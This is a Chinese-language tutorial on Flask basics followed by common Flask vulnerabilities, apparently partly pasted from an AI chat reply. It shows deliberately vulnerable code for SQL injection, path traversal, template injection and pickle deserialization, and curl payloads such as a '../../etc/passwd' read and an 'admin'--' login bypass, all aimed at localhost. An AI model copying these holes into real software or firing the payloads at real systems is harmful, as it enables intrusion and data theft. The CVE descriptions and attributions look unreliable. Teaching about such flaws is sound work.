<h2 id="Flask-框架架构与基础概念"><a href="#Flask-框架架构与基础概念" class="headerlink" title="Flask 框架架构与基础概念"></a>Flask 框架架构与基础概念</h2><h3 id="路由机制"><a href="#路由机制" class="headerlink" title="路由机制"></a>路由机制</h3><p>Flask 路由机制通过 <code>@app.route()</code> 装饰器来将 URL 映射到对应的函数。这意味着，用户访问某个 URL 时，Flask 会自动调用对应的视图函数，并返回结果给用户。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p><strong>解释</strong>：</p>
<ul>
<li><code>@app.route(&#39;/&#39;)</code> 是路由装饰器，绑定 URL <code>/</code> 到 <code>index</code> 函数。当用户访问根路径 <code>/</code> 时，将调用 <code>index</code> 函数，返回 <code>&quot;Hello, Flask!&quot;</code>。</li>
<li><code>app.run(debug=True)</code> 启动服务器并启用调试模式，方便开发时查看错误信息。</li>
</ul>
<hr>
<h3 id="请求与响应"><a href="#请求与响应" class="headerlink" title="请求与响应"></a>请求与响应</h3><p>Flask 通过 <code>request</code> 对象来处理 HTTP 请求数据，通过 <code>response</code> 对象来返回响应结果。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    password = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>    <br>    <span class="hljs-keyword">if</span> username == <span class="hljs-string">&quot;admin&quot;</span> <span class="hljs-keyword">and</span> password == <span class="hljs-string">&quot;password&quot;</span>:<br>        <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Logged in successfully!&quot;</span>&#125;)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;failure&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Login failed.&quot;</span>&#125;)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p><strong>解释</strong>：</p>
<ul>
<li><code>request.form.get(&#39;username&#39;)</code> 用来获取 POST 请求中的表单数据。</li>
<li>根据用户名和密码进行简单的身份验证，并返回 JSON 响应，通过 <code>jsonify()</code> 函数将 Python 数据结构转换为 JSON 格式。</li>
</ul>
<hr>
<h3 id="模板渲染"><a href="#模板渲染" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>Flask 使用 Jinja2 模板引擎来渲染 HTML 模板，这样可以将动态数据传递到前端页面。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p><strong>解释</strong>：</p>
<ul>
<li><code>render_template(&#39;user.html&#39;, name=name)</code> 加载并渲染 <code>user.html</code> 模板，并将变量 <code>name</code> 传递给模板。</li>
<li><code>&lt;name&gt;</code> 是 URL 参数，访问 <code>/user/Alice</code> 时，<code>Alice</code> 会被传递给视图函数，渲染到模板中。</li>
</ul>
<p>**模板文件 <code>user.html</code>**：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Flask Template<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Hello, &#123;&#123; name &#125;&#125;!<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>

<p>当访问 <code>/user/Alice</code> 时，页面将显示 <code>Hello, Alice!</code>。</p>
<hr>
<h3 id="会话与-Cookie-管理"><a href="#会话与-Cookie-管理" class="headerlink" title="会话与 Cookie 管理"></a>会话与 Cookie 管理</h3><p>Flask 可以使用会话来存储用户的临时数据，会话数据存储在客户端 Cookie 中，并通过 Flask 的 <code>secret_key</code> 签名以确保安全。</p>
<p><strong>代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, session<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/get_session&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_session</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;username&#x27;</span> <span class="hljs-keyword">in</span> session:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Logged in as <span class="hljs-subst">&#123;session[<span class="hljs-string">&#x27;username&#x27;</span>]&#125;</span>&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No session set.&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<p><strong>解释</strong>：</p>
<ul>
<li><code>session[&#39;username&#39;]</code> 用来设置会话变量，并通过 Cookie 保存。</li>
<li><code>app.secret_key</code> 是用来签名会话数据的密钥，确保数据没有被篡改。</li>
</ul>
<hr>
<ul>
<li><p>好的！以下是带有详细目录的完整笔记，结合了之前的内容，并根据 Flask 中的常见漏洞（如 SQL 注入、远程代码执行、反序列化漏洞、文件上传路径遍历）进行详细的解释、利用方式、潜在的危害和防御措施。</p>
<hr>
<h1 id="Flask-安全漏洞详解与防御措施"><a href="#Flask-安全漏洞详解与防御措施" class="headerlink" title="Flask 安全漏洞详解与防御措施"></a>Flask 安全漏洞详解与防御措施</h1><h2 id="目录-7"><a href="#目录-7" class="headerlink" title="目录"></a>目录</h2><ul>
<li><a href="#flask-%E6%A1%86%E6%9E%B6%E6%9E%B6%E6%9E%84%E4%B8%8E%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">Flask 框架架构与基础概念</a><ul>
<li><a href="#%E8%B7%AF%E7%94%B1%E6%9C%BA%E5%88%B6">路由机制</a></li>
<li><a href="#%E8%AF%B7%E6%B1%82%E4%B8%8E%E5%93%8D%E5%BA%94">请求与响应</a></li>
<li><a href="#%E6%A8%A1%E6%9D%BF%E6%B8%B2%E6%9F%93">模板渲染</a></li>
<li><a href="#%E4%BC%9A%E8%AF%9D%E4%B8%8E-cookie-%E7%AE%A1%E7%90%86">会话与 Cookie 管理</a></li>
</ul>
</li>
<li><a href="#flask-%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E">Flask 常见的安全漏洞</a><ul>
<li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">SQL 注入漏洞</a></li>
<li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">路径遍历漏洞</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8Crce">远程代码执行漏洞 (RCE)</a></li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">反序列化漏洞</a></li>
</ul>
</li>
<li><a href="#flask-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95">Flask 漏洞利用方法</a><ul>
<li><a href="#sql-%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB">SQL 注入攻击</a></li>
<li><a href="#%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB">远程代码执行攻击</a></li>
<li><a href="#%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%94%BB%E5%87%BB">路径遍历攻击</a></li>
<li><a href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB">反序列化攻击</a></li>
</ul>
</li>
<li><a href="#flask-%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1%E6%8E%AA%E6%96%BD">Flask 安全防御措施</a><ul>
<li><a href="#%E4%BD%BF%E7%94%A8-sqlalchemy-%E9%98%B2%E6%AD%A2-sql-%E6%B3%A8%E5%85%A5">使用 SQLAlchemy 防止 SQL 注入</a></li>
<li><a href="#%E8%B7%AF%E5%BE%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%8E%A7%E5%88%B6">路径安全性控制</a></li>
<li><a href="#%E7%A6%81%E7%94%A8%E6%A8%A1%E6%9D%BF%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C">禁用模板代码执行</a></li>
<li><a href="#%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE-cookie">安全配置 Cookie</a></li>
</ul>
</li>
<li><a href="#%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93">漏洞总结</a><ul>
<li><a href="#cve-2019-1010083---sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E">CVE-2019-1010083 - SQL 注入漏洞</a></li>
<li><a href="#cve-2019-1010084---%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E">CVE-2019-1010084 - 远程代码执行漏洞</a></li>
<li><a href="#cve-2018-1000656---%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">CVE-2018-1000656 - 反序列化漏洞</a></li>
<li><a href="#cve-2019-1010085---%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%B7%AF%E5%BE%84%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E">CVE-2019-1010085 - 文件上传路径遍历漏洞</a></li>
</ul>
</li>
</ul>
<hr>
<h2 id="Flask-框架架构与基础概念-1"><a href="#Flask-框架架构与基础概念-1" class="headerlink" title="Flask 框架架构与基础概念"></a>Flask 框架架构与基础概念</h2><h3 id="路由机制-1"><a href="#路由机制-1" class="headerlink" title="路由机制"></a>路由机制</h3><p>Flask 使用路由装饰器 <code>@app.route()</code> 将 URL 路径映射到视图函数。用户访问特定 URL 时，Flask 调用相应函数并返回结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Hello, Flask!&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>

<h3 id="请求与响应-1"><a href="#请求与响应-1" class="headerlink" title="请求与响应"></a>请求与响应</h3><p>Flask 使用 <code>request</code> 对象处理 HTTP 请求，通过 <code>response</code> 对象返回结果。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> request, jsonify<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&#x27;username&#x27;</span>: username, <span class="hljs-string">&#x27;password&#x27;</span>: password&#125;)<br></code></pre></td></tr></table></figure>

<h3 id="模板渲染-1"><a href="#模板渲染-1" class="headerlink" title="模板渲染"></a>模板渲染</h3><p>Flask 通过 Jinja2 模板引擎渲染动态 HTML 页面，并允许传递数据。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user/&lt;name&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">user</span>(<span class="hljs-params">name</span>):<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=name)<br></code></pre></td></tr></table></figure>

<h3 id="会话与-Cookie-管理-1"><a href="#会话与-Cookie-管理-1" class="headerlink" title="会话与 Cookie 管理"></a>会话与 Cookie 管理</h3><p>Flask 会话使用 Cookie 存储临时数据，并通过 <code>secret_key</code> 对数据签名。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">app.secret_key = <span class="hljs-string">&#x27;super_secret_key&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/set_session/&lt;username&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_session</span>(<span class="hljs-params">username</span>):<br>    session[<span class="hljs-string">&#x27;username&#x27;</span>] = username<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;Session set for <span class="hljs-subst">&#123;username&#125;</span>&quot;</span><br></code></pre></td></tr></table></figure>

<hr>
<h2 id="Flask-常见的安全漏洞"><a href="#Flask-常见的安全漏洞" class="headerlink" title="Flask 常见的安全漏洞"></a>Flask 常见的安全漏洞</h2><h3 id="SQL-注入漏洞"><a href="#SQL-注入漏洞" class="headerlink" title="SQL 注入漏洞"></a>SQL 注入漏洞</h3><p>SQL 注入漏洞是由于应用程序直接将用户输入的数据嵌入 SQL 查询中，攻击者可以通过构造恶意 SQL 语句绕过身份验证、读取或修改数据库中的敏感信息。</p>
<p><strong>易受攻击代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/user&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_user</span>():<br>    username = request.args.get(<span class="hljs-string">&#x27;username&#x27;</span>)<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure>

<p><strong>攻击方式</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=&#x27; OR &#x27;1&#x27;=&#x27;1&quot;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="路径遍历漏洞"><a href="#路径遍历漏洞" class="headerlink" title="路径遍历漏洞"></a>路径遍历漏洞</h3><p>路径遍历漏洞允许攻击者通过构造文件路径，访问服务器上的任意文件。</p>
<p><strong>易受攻击代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&#x27;/uploads&#x27;</span>, filename)<br></code></pre></td></tr></table></figure>

<p><strong>攻击方式</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="远程代码执行漏洞-RCE"><a href="#远程代码执行漏洞-RCE" class="headerlink" title="远程代码执行漏洞 (RCE)"></a>远程代码执行漏洞 (RCE)</h3><p>模板注入漏洞会导致攻击者能够注入恶意模板代码，执行任意服务器端的 Python 代码。</p>
<p><strong>易受攻击代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/template&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">template</span>():<br>    user_input = request.args.get(<span class="hljs-string">&#x27;template&#x27;</span>)<br>    <span class="hljs-keyword">return</span> render_template_string(user_input)<br></code></pre></td></tr></table></figure>

<p><strong>攻击方式</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<hr>
<h3 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h3><p>反序列化漏洞发生在应用程序不安全地反序列化用户提供的数据时，攻击者可以通过构造恶意的序列化数据来执行任意代码。</p>
<p><strong>易受攻击代码示例</strong>：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/load_data&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load_data</span>():<br>    data = request.data<br>    obj = pickle.loads(data)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure>

<hr>
<h2 id="Flask-漏洞利用方法"><a href="#Flask-漏洞利用方法" class="headerlink" title="Flask 漏洞利用方法"></a>Flask 漏洞利用方法</h2><h3 id="SQL-注入攻击"><a href="#SQL-注入攻击" class="headerlink" title="SQL 注入攻击"></a>SQL 注入攻击</h3><p>通过提交恶意的 SQL 语句，攻击者可以操纵 SQL 查询的执行。</p>
<p><strong>攻击方式</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/user?username=admin&#x27;--&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="远程代码执行攻击"><a href="#远程代码执行攻击" class="headerlink" title="远程代码执行攻击"></a>远程代码执行攻击</h3><p>通过传递恶意的 Jinja2 模板表达式，攻击者可以执行任意代码。</p>
<p><strong>攻击方式</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/template?template=&#123;&#123;7*7&#125;&#125;&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="路径遍历攻击"><a href="#路径遍历攻击" class="headerlink" title="路径遍历攻击"></a>路径遍历攻击</h3><p>构造恶意文件路径，读取服务器上的任意文件。</p>
<p><strong>攻击方式</strong>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://localhost:5000/file/../../etc/passwd&quot;</span><br></code></pre></td></tr></table></figure>

<h3 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h3><p>通过发送恶意的序列化数据，攻击者可以控制应用程序执行任意操作。</p>
<hr>
</li>
</ul>
<h2 id="CVE-2019-1010083-Flask-Security-SQL-注入漏洞"><a href="#CVE-2019-1010083-Flask-Security-SQL-注入漏洞" class="headerlink" title="CVE-2019-1010083 - Flask-Security SQL 注入漏洞"></a>CVE-2019-1010083 - Flask-Security SQL 注入漏洞</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p><strong>CVE-2019-1010083</strong> 是 Flask-Security 插件中的 SQL 注入漏洞。Flask-Security 是用于快速集成用户身份认证和权限管理的插件。这个漏洞出现在 Flask-Security 中，在特定情况下，攻击者能够构造恶意 SQL 查询，插入到应用程序的查询语句中，进而执行任意 SQL 操作。</p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击者可以通过特定参数进行 SQL 注入操作，绕过身份验证或提取敏感数据。</p>
<h4 id="示例代码："><a href="#示例代码：" class="headerlink" title="示例代码："></a>示例代码：</h4><p>假设应用程序中使用了 Flask-Security 进行用户身份认证，漏洞可能出现在以下代码片段中：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request<br><span class="hljs-keyword">import</span> sqlite3<br><br>app = Flask(__name__)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    username = request.form[<span class="hljs-string">&#x27;username&#x27;</span>]<br>    password = request.form[<span class="hljs-string">&#x27;password&#x27;</span>]<br>    query = <span class="hljs-string">f&quot;SELECT * FROM users WHERE username = &#x27;<span class="hljs-subst">&#123;username&#125;</span>&#x27; AND password = &#x27;<span class="hljs-subst">&#123;password&#125;</span>&#x27;&quot;</span><br>    conn = sqlite3.connect(<span class="hljs-string">&#x27;example.db&#x27;</span>)<br>    result = conn.execute(query)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(result.fetchall())<br></code></pre></td></tr></table></figure>

<h4 id="利用方法："><a href="#利用方法：" class="headerlink" title="利用方法："></a>利用方法：</h4><p>攻击者可以通过提交恶意表单，构造输入来绕过身份验证或查询其他用户信息。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST -d <span class="hljs-string">&quot;username=admin&#x27;--&amp;password=&quot;</span> http://localhost:5000/login<br></code></pre></td></tr></table></figure>

<p><strong>攻击原理</strong>：</p>
<ol>
<li><code>username</code> 参数通过用户输入的方式传递，未经任何过滤和转义直接插入 SQL 查询。</li>
<li>攻击者可以通过构造 <code>username=admin&#39;--</code>，注释掉后面的 <code>password</code> 查询部分，实现 SQL 注入。</li>
</ol>
<p><strong>解决方法</strong>：<br>使用参数化查询或者 ORM 工具，避免直接拼接用户输入到 SQL 查询中。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用参数化查询防止 SQL 注入</span><br>query = <span class="hljs-string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span><br>result = conn.execute(query, (username, password))<br></code></pre></td></tr></table></figure>

<hr>
